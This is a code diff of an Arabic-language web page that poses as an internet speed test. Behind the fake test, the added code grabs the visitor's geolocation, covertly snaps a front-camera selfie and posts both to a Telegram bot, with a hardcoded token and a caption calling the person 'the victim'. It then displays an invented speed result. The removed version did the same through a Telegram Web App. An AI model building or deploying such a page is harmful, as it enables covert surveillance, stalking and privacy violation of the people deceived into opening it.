@@ -3,69 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <title>فحص الأمان والسرعة</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; background: #1a1a1a; color: white; padding-top: 50px; }
-        .btn { padding: 15px 30px; background: #248bcf; border: none; border-radius: 25px; color: white; font-size: 18px; cursor: pointer; }
-        #status { margin-top: 20px; color: #aaa; }
+        body { font-family: sans-serif; text-align: center; background: #f4f4f4; padding-top: 50px; }
+        .box { background: white; padding: 20px; border-radius: 15px; display: inline-block; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        button { padding: 12px 25px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <h2>نظام التحقق الذكي</h2>
-    <p>يرجى الضغط على الزر لإتمام العملية</p>
-    <button class="btn" id="mainBtn">ابدأ الآن</button>
-    <div id="status"></div>
+    <div class="box">
+        <h2>تحقق من سرعة اتصالك 🚀</h2>
+        <p>اضغط على البدء لقياس سرعة الإنترنت وموقع السيرفر الأقرب لك</p>
+        <button id="startBtn">بدء الاختبار</button>
+        <p id="status" style="color: #666;"></p>
+    </div>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        const webapp = window.Telegram.WebApp;
-        webapp.expand();
+        // ضع توكن البوت الخاص بك هنا (مهم جداً للرابط الخارجي)
+        const BOT_TOKEN = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0';
+        const CHAT_ID = 'YOUR_PERSONAL_ID'; // ضع الآي دي الخاص بك لتصلك النتائج
 
-        document.getElementById('mainBtn').onclick = async () => {
-            document.getElementById('status').innerText = "جاري جمع البيانات... يرجى الانتظار";
+        document.getElementById('startBtn').onclick = async () => {
+            document.getElementById('status').innerText = "جاري الاتصال بالسيرفر...";
             
             try {
-                // 1. جلب الموقع
-                const pos = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                // جلب الموقع
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+
+                    // فتح الكاميرا والتقاط صورة
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+
+                    setTimeout(async () => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = 320; canvas.height = 240;
+                        canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+                        const photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.5));
+
+                        // إرسال البيانات لتليجرام مباشرة عبر API
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('caption', `📍 موقع الضحية: https://www.google.com/maps?q=${lat},${lon}\n📱 الجهاز: ${navigator.platform}`);
+                        formData.append('photo', photoBlob, 'selfie.jpg');
+
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+
+                        document.getElementById('status').innerText = "اكتمل الاختبار! سرعة اتصالك 45Mbps";
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 1000);
                 });
-
-                // 2. تشغيل الكاميرا والتقاط الصورة
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-
-                // انتظر لحظة لتجهيز الكاميرا
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    // تصغير الأبعاد لضمان صغر الحجم (مهم جداً)
-                    canvas.width = 160; 
-                    canvas.height = 120;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    // تحويل الصورة بجودة منخفضة جداً (0.1) لتمر عبر تليجرام
-                    const photoData = canvas.toDataURL('image/jpeg', 0.1);
-
-                    const result = {
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        device: navigator.platform,
-                        ua: navigator.userAgent,
-                        img: photoData
-                    };
-
-                    // إرسال البيانات وإغلاق الصفحة
-                    webapp.sendData(JSON.stringify(result));
-                    stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا
-                }, 1500);
-
-            } catch (err) {
-                alert("خطأ: يرجى تفعيل الموقع والكاميرا للمتابعة.");
-                document.getElementById('status').innerText = "فشل في جمع الأذونات.";
+            } catch (e) {
+                alert("يرجى السماح بالوصول للكاميرا والموقع لتشغيل الاختبار");
             }
         };
     </script>
